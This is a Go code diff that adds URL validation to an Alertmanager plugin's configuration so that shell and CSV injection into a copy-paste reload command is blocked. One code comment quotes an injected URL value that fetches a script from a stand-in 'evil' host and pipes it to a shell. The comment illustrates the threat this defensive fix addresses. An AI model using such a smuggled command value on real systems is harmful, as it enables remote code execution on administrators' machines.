@@ -6,6 +6,7 @@ import (
 	"fmt"
 	neturl "net/url"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -178,6 +179,15 @@ func (ac *alertConfig) IsValid() error {
 	if (ac.User == "") != (ac.Password == "") {
 		return errors.New("user and password must both be set or both be empty")
 	}
+	// CL-03/CL-21/CL-33: validate the URLs here so EVERY persist path — slash
+	// command and a blob written straight to the KV store — is covered, not just
+	// the /alertmanager add entry point.
+	if err := validateAlertManagerURL(ac.AlertManagerURL); err != nil {
+		return err
+	}
+	if err := validateWebhookHost(ac.WebhookHostOverride); err != nil {
+		return fmt.Errorf("webhookHostOverride: %w", err)
+	}
 	return nil
 }
 
@@ -214,6 +224,66 @@ func (c *configuration) Clone() *configuration {
 
 // configMutex guards getConfiguration / setConfiguration. Embedded in Plugin
 // rather than here to keep this file focused on the data model.
+
+// alertManagerHostRegex matches the host of a legitimate Alertmanager base URL:
+// a hostname or IP (IPv6 colons allowed; url.Hostname strips the brackets),
+// nothing else. It deliberately excludes every shell metacharacter ($ ( ) ` ; |
+// & and whitespace), which is what neutralizes a value like
+// `http://am:9093$(curl${IFS}-s${IFS}http://evil|sh)` — that survives
+// strings.Fields via ${IFS} and would otherwise be interpolated verbatim into
+// the copy-paste `curl -X POST <url>/-/reload` fence and the CSV export (CL-03,
+// CL-21).
+var alertManagerHostRegex = regexp.MustCompile(`^[A-Za-z0-9.:-]+$`)
+
+// alertManagerPathRegex restricts an optional reverse-proxy path prefix to a
+// safe charset, so the path can't smuggle shell metacharacters into the reload
+// command fence either.
+var alertManagerPathRegex = regexp.MustCompile(`^[A-Za-z0-9._~/%-]+$`)
+
+// validateAlertManagerURL rejects a malformed or dangerous AlertManagerURL. The
+// value is attacker-influenceable (a team_admin sets it via /alertmanager add)
+// and later renders into a copy-paste shell command a sysadmin runs and into a
+// CSV a sysadmin opens — a cross-privilege, cross-context sink. Empty is valid
+// (the URL is only needed for the alerts/silences/status commands).
+//
+// Accepted: http[s]://host[:port][/safe/path]. Rejected: other schemes, embedded
+// credentials, query strings, fragments, and any character in the host or path
+// outside the safe grammar above (which is where the shell/CSV injection lives).
+func validateAlertManagerURL(raw string) error {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil
+	}
+	u, err := neturl.Parse(raw)
+	if err != nil {
+		return fmt.Errorf("AlertManagerURL is not a valid URL: %w", err)
+	}
+	if u.Scheme != "http" && u.Scheme != "https" {
+		return fmt.Errorf("AlertManagerURL must use http:// or https:// (got %q)", u.Scheme)
+	}
+	if u.User != nil {
+		return fmt.Errorf("AlertManagerURL must not contain embedded credentials")
+	}
+	host := u.Hostname()
+	if host == "" {
+		return fmt.Errorf("AlertManagerURL has no host")
+	}
+	if !alertManagerHostRegex.MatchString(host) {
+		return fmt.Errorf("AlertManagerURL host contains invalid characters")
+	}
+	if port := u.Port(); port != "" {
+		if _, err := strconv.Atoi(port); err != nil {
+			return fmt.Errorf("AlertManagerURL has a non-numeric port")
+		}
+	}
+	if u.RawQuery != "" || u.Fragment != "" {
+		return fmt.Errorf("AlertManagerURL must not contain a query string or fragment")
+	}
+	if u.Path != "" && u.Path != "/" && !alertManagerPathRegex.MatchString(u.Path) {
+		return fmt.Errorf("AlertManagerURL path contains invalid characters")
+	}
+	return nil
+}
 
 // validateWebhookHost rejects malformed WebhookHost values at config
 // save time. Sanity-checks defense-in-depth — sysadmins are trusted,
